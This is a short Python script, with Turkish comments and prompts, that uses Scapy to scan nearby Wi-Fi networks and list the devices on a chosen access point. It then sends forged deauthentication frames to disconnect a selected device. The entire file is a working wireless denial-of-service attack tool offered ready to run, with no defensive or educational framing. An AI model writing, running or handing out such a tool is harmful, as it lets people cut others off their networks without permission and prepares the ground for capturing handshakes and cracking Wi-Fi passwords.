from scapy.all import *
import os

iface = "wlan0"  # Monitor moda alınmış olmalı

networks = {}
clients = []

def sniff_beacons(pkt):
    if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
        bssid = pkt[Dot11].addr3
        essid = pkt[Dot11Elt].info.decode(errors="ignore")
        channel = int(ord(pkt[Dot11Elt:3].info))
        if bssid not in networks:
            networks[bssid] = (essid, channel)
            print(f"[+] ESSID: {essid} | BSSID: {bssid} | Kanal: {channel}")

def list_devices(pkt):
    if pkt.haslayer(Dot11):
        if pkt.addr2 and pkt.addr1 and pkt.addr1.lower() == target_bssid.lower():
            client_mac = pkt.addr2
            if client_mac not in clients:
                clients.append(client_mac)
                print(f"[+] Cihaz bulundu: {client_mac}")

def send_deauth(bssid, client):
    dot11 = Dot11(addr1=client, addr2=bssid, addr3=bssid)
    frame = RadioTap()/dot11/Dot11Deauth(reason=7)
    sendp(frame, inter=0.1, count=20, iface=iface, verbose=1)

def monitor_networks():
    print("[*] Ağlar taranıyor, CTRL+C ile durdur.")
    sniff(iface=iface, prn=sniff_beacons, timeout=30)

def scan_clients(bssid):
    global target_bssid
    target_bssid = bssid
    print("[*] Cihazlar taranıyor, CTRL+C ile durdur.")
    sniff(iface=iface, prn=list_devices, timeout=20)

if __name__ == "__main__":
    try:
        print("[*] Kutbörü başlıyor (Scapy sürümü)")
        monitor_networks()
        bssid = input("Hedef BSSID seç: ")
        scan_clients(bssid)
        for i, client in enumerate(clients):
            print(f"{i}) {client}")
        idx = int(input("Cihaz seç: "))
        send_deauth(bssid, clients[idx])
    except KeyboardInterrupt:
        print("\n[!] Durduruldu.")
    except Exception as e:
        print(f"[!] Hata: {e}")
